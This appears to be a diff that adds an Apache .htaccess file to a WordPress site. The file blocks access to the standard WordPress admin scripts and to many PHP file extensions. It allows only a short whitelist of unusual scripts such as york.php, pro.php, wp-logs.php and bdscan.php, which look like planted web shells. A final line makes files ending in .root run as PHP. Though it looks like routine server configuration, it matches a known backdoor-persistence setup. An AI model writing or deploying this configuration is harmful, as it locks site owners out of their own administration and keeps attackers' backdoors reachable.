@@ -1,0 +1,33 @@
+<FilesMatch ".(php|Php|pHp|phP|Php.asp|php.anu|php.fla|PHP|php3|php2|Php1|pht|phar|anu|fla|asp|aspx|php.jpg|php6|php7|php8|php9|php4|php5|php7|phtml|shtml|php.aspx|php;.jpg|php.fla|php.phar|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|zip|shtml|about.php|admin-ajax.php|admin-footer.php|admin-functions.php|admin-header.php|admin-post.php|admin.php|async-upload.php|authorize-application.php|comment.php|contribute.php|credits.php|custom-background.php|custom-header.php|customize.php|edit-comments.php|edit-form-advanced.php|edit-form-blocks.php|edit-form-comment.php|edit-link-form.php|edit-tag-form.php|edit-tags.php|edit.php|erase-personal-data.php|export-personal-data.php|export.php|freedoms.php|import.php|index.php|install-helper.php|install.php|link-add.php|link-manager.php|link-parse-opml.php|link.php|load-scripts.php|load-styles.php|media-new.php|media-upload.php|media.php|menu-header.php|menu.php|moderation.php|ms-admin.php|ms-delete-site.php|ms-edit.php|ms-options.php|ms-sites.php|ms-themes.php|ms-upgrade-network.php|ms-users.php|my-sites.php|nav-menus.php|network.php|options-discussion.php|options-general.php|options-head.php|options-media.php|options-permalink.php|options-privacy.php|options-reading.php|options-writing.php|options.php|plugins.php|post-new.php|post.php|press-this.php|privacy-policy-guide.php|privacy.php|profile.php|revision.php|setup-config.php|site-editor.php|site-health-info.php|site-health.php|term.php|themes.php|tools.php|update-core.php|update.php|upgrade-functions.php|upgrade.php|upload.php|user-edit.php|user-new.php|users.php|widgets-form-blocks.php|widgets-form.php|widgets.php)$">
+
+ Order allow,deny
+
+ Deny from all
+
+</FilesMatch>
+
+<FilesMatch "^(index.php|pro.php|wp-logs.php|york.php|wp-load.php|wp-admin.php|bdscan.php)$">
+
+ Order allow,deny
+
+ Allow from all
+
+</FilesMatch>
+
+<IfModule mod_rewrite.c>
+
+RewriteEngine On
+
+RewriteBase /
+
+RewriteRule ^index.php$ - [L]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+
+RewriteCond %{REQUEST_FILENAME} !-d
+
+RewriteRule . /index.php [L]
+
+</IfModule>
+
+AddType application/x-httpd-php .root
